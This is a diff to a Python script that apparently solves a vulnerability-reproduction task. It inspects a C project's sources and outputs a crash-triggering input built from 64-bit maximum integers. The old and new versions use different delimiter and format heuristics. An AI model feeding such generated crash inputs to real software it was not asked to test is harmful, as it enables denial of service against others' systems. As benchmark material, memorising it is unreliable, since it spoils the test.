@@ -1,96 +1,84 @@
 import os
 import re
 import tarfile
-import tempfile
-from typing import Optional
+from typing import Dict, Optional
 
 
 class Solution:
-    def _extract(self, src_path: str) -> str:
-        if os.path.isdir(src_path):
-            return src_path
-        tmpdir = tempfile.mkdtemp(prefix="poc_src_")
-        with tarfile.open(src_path, "r:*") as tf:
-            def is_within_directory(directory: str, target: str) -> bool:
-                abs_directory = os.path.abspath(directory)
-                abs_target = os.path.abspath(target)
-                return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])
+    _INT_MAX_64 = "9223372036854775807"
 
-            for member in tf.getmembers():
-                member_path = os.path.join(tmpdir, member.name)
-                if not is_within_directory(tmpdir, member_path):
-                    continue
-                tf.extract(member, tmpdir)
-        entries = os.listdir(tmpdir)
-        if len(entries) == 1:
-            one = os.path.join(tmpdir, entries[0])
-            if os.path.isdir(one):
-                return one
-        return tmpdir
+    def _score_delims_from_format(self, fmt: str, counts: Dict[str, int]) -> None:
+        conv_re = re.compile(r'%(?:\*?\d+)?(?:hh|h|ll|l|j|z|t|L)?[diouxX]')
+        spans = [m.span() for m in conv_re.finditer(fmt)]
+        if len(spans) < 2:
+            return
+        (s1, e1), (s2, e2) = spans[0], spans[1]
+        between = fmt[e1:s2]
+        if '.' in between:
+            counts['.'] += 1
+        if ',' in between:
+            counts[','] += 1
+        if ':' in between:
+            counts[':'] += 1
+        if ' ' in between or '\t' in between or '\n' in between or '\r' in between:
+            counts[' '] += 1
 
-    def _detect_leading_percent_required(self, root: str) -> bool:
-        exts = {".c", ".cc", ".cpp", ".h", ".hh", ".hpp"}
-        max_files = 2000
-        max_bytes = 262144
+    def _infer_delim(self, src_path: str) -> str:
+        counts: Dict[str, int] = {'.': 0, ' ': 0, ',': 0, ':': 0}
 
-        pat1 = re.compile(r'\bsscanf\s*\([^;]{0,600}?"[^"]*%%%[^"]*?\.[^"]*?"', re.DOTALL)
-        pat2 = re.compile(r'"[^"]*%%%[^"]*%l[dui][^"]*\.[^"]*%l[dui][^"]*"', re.DOTALL)
-        pat3 = re.compile(r'"[^"]*%%%[^"]*%lld[^"]*\.[^"]*%lld[^"]*"', re.DOTALL)
+        def bump_if_found(text: str) -> None:
+            for m in re.finditer(r'\bsscanf\s*\((?:.|\n)*?\)', text):
+                seg = m.group(0)
+                fm = re.search(r'"([^"\n]{1,256})"', seg)
+                if fm:
+                    self._score_delims_from_format(fm.group(1), counts)
 
-        count = 0
-        for dirpath, dirnames, filenames in os.walk(root):
-            dirnames[:] = [d for d in dirnames if d not in {".git", ".svn", ".hg", "build", "dist"}]
-            for fn in filenames:
-                if count >= max_files:
-                    return False
-                _, ext = os.path.splitext(fn)
-                if ext.lower() not in exts:
-                    continue
-                path = os.path.join(dirpath, fn)
-                try:
-                    sz = os.path.getsize(path)
-                    if sz <= 0:
+            for fm in re.finditer(r'\bstrtok\s*\([^,]+,\s*"([^"]+)"\s*\)', text):
+                d = fm.group(1)
+                if '.' in d:
+                    counts['.'] += 1
+                if ',' in d:
+                    counts[','] += 1
+                if ':' in d:
+                    counts[':'] += 1
+                if any(ch in d for ch in " \t\r\n"):
+                    counts[' '] += 1
+
+            for fm in re.finditer(r"\bstrchr\s*\(\s*[^,]+,\s*'(.?)'\s*\)", text):
+                ch = fm.group(1)
+                if ch in counts:
+                    counts[ch] += 1
+
+        try:
+            with tarfile.open(src_path, "r:*") as tf:
+                for m in tf.getmembers():
+                    if not m.isreg():
                         continue
-                    with open(path, "rb") as f:
-                        data = f.read(min(sz, max_bytes))
+                    name = m.name.lower()
+                    if not any(name.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp")):
+                        continue
+                    f = tf.extractfile(m)
+                    if f is None:
+                        continue
                     try:
-                        s = data.decode("utf-8", "ignore")
+                        data = f.read(2_000_000)
                     except Exception:
                         continue
-                except Exception:
-                    continue
+                    try:
+                        text = data.decode("utf-8", "ignore")
+                    except Exception:
+                        text = data.decode("latin-1", "ignore")
+                    bump_if_found(text)
+        except Exception:
+            pass
 
-                count += 1
-                if (pat1.search(s) is not None) or (pat2.search(s) is not None) or (pat3.search(s) is not None):
-                    return True
-        return False
+        best = max(counts.items(), key=lambda kv: (kv[1], kv[0] == '.'))
+        delim = best[0] if best[1] > 0 else '.'
+        if delim not in ('.', ' ', ',', ':'):
+            delim = '.'
+        return delim
 
     def solve(self, src_path: str) -> bytes:
-        root = self._extract(src_path)
-
-        max19 = "9223372036854775807"  # 19 digits
-        max18 = "922337203685477580"   # 18 digits
-
-        need_percent = self._detect_leading_percent_required(root)
-        if need_percent:
-            poc = ("%" + max19 + "." + max18 + "d").encode("ascii")
-        else:
-            poc = (max19 + "." + max19 + "d").encode("ascii")
-
-        if len(poc) != 40:
-            if poc.startswith(b"%"):
-                w = max19
-                p = max19
-                if len(("%" + w + "." + p + "d")) > 40:
-                    p = max18
-                poc = ("%" + w + "." + p + "d").encode("ascii")
-            else:
-                w = max19
-                p = max19
-                poc = (w + "." + p + "d").encode("ascii")
-            if len(poc) > 40:
-                poc = poc[:40]
-            elif len(poc) < 40:
-                poc = poc + (b"0" * (40 - len(poc)))
-
-        return poc
+        delim = self._infer_delim(src_path)
+        s = f"{self._INT_MAX_64}{delim}{self._INT_MAX_64}\n"
+        return s.encode("ascii", "strict")
